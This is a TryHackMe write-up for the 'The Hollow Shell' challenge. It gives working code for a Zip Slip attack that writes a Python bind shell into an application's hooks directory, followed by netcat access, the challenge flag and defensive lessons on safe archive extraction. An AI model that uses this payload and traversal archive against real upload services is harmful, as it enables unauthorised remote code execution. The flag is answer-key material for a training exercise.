# TryHackMe — The Hollow Shell

> **Platform:** TryHackMe  
> **Challenge:** The Hollow Shell  
> **Category:** Web Exploitation  
> **Concepts:** Nmap Enumeration · Zip Slip (Path Traversal via Archive) · Bind Shell  
> **Flag:** `THM{z1p_sl1pp3d_1nt0_a_sh3ll}`

---

## Attack Chain Overview

```
Web application unreachable
        ↓
Nmap scan → ports 22 (SSH) and 5000 (web app) open
        ↓
SSH approach attempted → failed
        ↓
Pivot: craft malicious zip with path traversal entry (Zip Slip)
        ↓
Zip contains ../../hooks/bind.py → bind shell payload
        ↓
Upload zip via web app on port 5000
        ↓
Server extracts zip without sanitizing paths → bind.py lands in hooks/
        ↓
bind.py executes → port 4444 opens on target
        ↓
nc <target> 4444 → shell → cat flag.txt
        ↓
Flag: THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Step 1 — Enumeration with Nmap

The target website was unreachable on port 80. Rather than stopping there, a full port scan was run to find what services were actually listening:

```bash
nmap -sV <target-ip>
```

**Open ports found:**

| Port | Service |
|------|---------|
| 22   | SSH (OpenSSH) |
| 5000 | Web application |

Port 5000 is a common port for development web servers (Python Flask, Node.js, etc.). The application on port 5000 turned out to accept file uploads — the actual attack surface.

---

## Step 2 — SSH Approach (Attempted)

The first instinct was to attempt SSH access. A fresh ed25519 keypair was generated:

```bash
ssh-keygen -t ed25519 -f thm_key -N "" -C "thm-holiday"
# Generates: thm_key (private) and thm_key.pub (public)
```

The plan was to inject the public key into `~/.ssh/authorized_keys` on the target via the upload functionality. This did not work — the application did not process or place files in a path that gave SSH access.

Pivoting to a different technique.

---

## Step 3 — Zip Slip Attack

### What is Zip Slip?

Zip Slip is a path traversal vulnerability in archive extraction. When a zip file is extracted, most libraries use the filename stored inside the zip as the destination path. If the server does not sanitize those filenames, a maliciously crafted entry like `../../hooks/bind.py` will escape the intended extraction directory and write the file to an arbitrary location on the filesystem.

```
Normal extraction:
  uploads/myfile.py  →  /app/uploads/myfile.py

Zip Slip:
  ../../hooks/bind.py  →  /app/hooks/bind.py
```

The application on port 5000 extracted uploaded zips without validating the entry paths — making it vulnerable.

---

### Step 3a — Create the Bind Shell Payload

A bind shell listens on a port on the **target** machine and waits for an incoming connection. Unlike a reverse shell (which calls back to the attacker), a bind shell sits open until the attacker connects to it.

```python
# bind.py — written to ../../hooks/ via Zip Slip
import socket, subprocess, os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)

conn, addr = s.accept()

for fd in (0, 1, 2):          # redirect stdin, stdout, stderr to the socket
    os.dup2(conn.fileno(), fd)

subprocess.call(["/bin/bash", "-i"])
```

**What each part does:**

- `socket.AF_INET, SOCK_STREAM` — standard TCP socket
- `SO_REUSEADDR` — allows reuse of the port immediately after a previous connection closes
- `bind("0.0.0.0", 4444)` — listen on all interfaces, port 4444
- `os.dup2(conn.fileno(), fd)` for fds 0, 1, 2 — redirects stdin, stdout, and stderr of the shell process to the socket, so everything typed over the network goes to bash and all output comes back
- `subprocess.call(["/bin/bash", "-i"])` — spawns an interactive bash shell

---

### Step 3b — Build the Malicious Zip

A manifest file and the zip itself were created using Python's `zipfile` library, writing the traversal path directly as the entry name:

```bash
# 1. Create the manifest
printf '{"name":"bind-shell","assets":[]}' > shell.json

# 2. Create the bind shell payload
cat > bind.py << 'EOF'
import socket, subprocess, os
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", 4444))
s.listen(1)
conn, addr = s.accept()
for fd in (0, 1, 2):
    os.dup2(conn.fileno(), fd)
subprocess.call(["/bin/bash", "-i"])
EOF

# 3. Build the zip with the traversal entry
python3 - << 'EOF'
import zipfile
with zipfile.ZipFile("bind-shell.zip", "w") as zf:
    zf.writestr("shell.json", '{"name":"bind-shell","assets":[]}')
    zf.writestr("../../hooks/bind.py", open("bind.py").read())
print("[+] built bind-shell.zip")
EOF

# 4. Verify the traversal entry is inside
unzip -l bind-shell.zip
```

**Expected output from `unzip -l`:**

```
Archive:  bind-shell.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       34  2026-08-04 12:00   shell.json
      249  2026-08-04 12:00   ../../hooks/bind.py    ← traversal entry confirmed
```

The `../../hooks/bind.py` entry is what makes this malicious. When the server extracts this zip, Python's (or any unpatched library's) extraction will resolve the `../..` and write the file two directories above the intended extraction location — landing it in the `hooks/` directory where the application will execute it.

---

## Step 4 — Upload and Connect

### Upload the zip

The malicious `bind-shell.zip` was uploaded through the web application's file upload interface on port 5000. The server extracted it, the traversal path resolved, and `bind.py` was written to `hooks/bind.py` — which the application automatically executed as a hook.

### Connect via Netcat

```bash
nc <target-ip> 4444
```

A shell prompt appeared. From there:

```bash
cat flag.txt
# THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Flag

```
THM{z1p_sl1pp3d_1nt0_a_sh3ll}
```

---

## Lessons Learned

**Never trust filenames inside an uploaded archive.**  
When extracting a zip, tar, or any archive on a server, every entry path must be validated before writing. The safe pattern in Python is:

```python
import zipfile, os

def safe_extract(zf, target_dir):
    for member in zf.namelist():
        member_path = os.path.realpath(os.path.join(target_dir, member))
        if not member_path.startswith(os.path.realpath(target_dir)):
            raise Exception(f"Path traversal detected: {member}")
    zf.extractall(target_dir)
```

**Bind shell vs reverse shell — knowing when each applies.**  
A reverse shell calls back to the attacker (useful when the target is behind a NAT or firewall). A bind shell opens a listener on the target (useful when the attacker can reach the target directly but the target cannot reach the attacker). In this challenge, the target was directly reachable, making bind shell the simpler approach.

**Hooks directories are high-value injection targets.**  
Many web frameworks auto-execute scripts placed in a `hooks/` or `plugins/` directory. Successfully writing arbitrary files into such a directory is often equivalent to remote code execution, even without any other vulnerability.

**Enumeration determines the attack surface.**  
The web app on port 80 was unreachable. Without the nmap scan, port 5000 would never have been found. Full port scanning is not optional — services running on non-standard ports are common in real environments and CTF labs alike.

---

## Quick Reference — Commands Used

```bash
# Port scanning
nmap -sV <target-ip>

# SSH key generation
ssh-keygen -t ed25519 -f thm_key -N "" -C "thm-holiday"

# Verify zip contents
unzip -l bind-shell.zip

# Connect to bind shell
nc <target-ip> 4444

# Read flag
cat flag.txt
```

---

*Writeup by Shrikrishna · TryHackMe — The Hollow Shell*
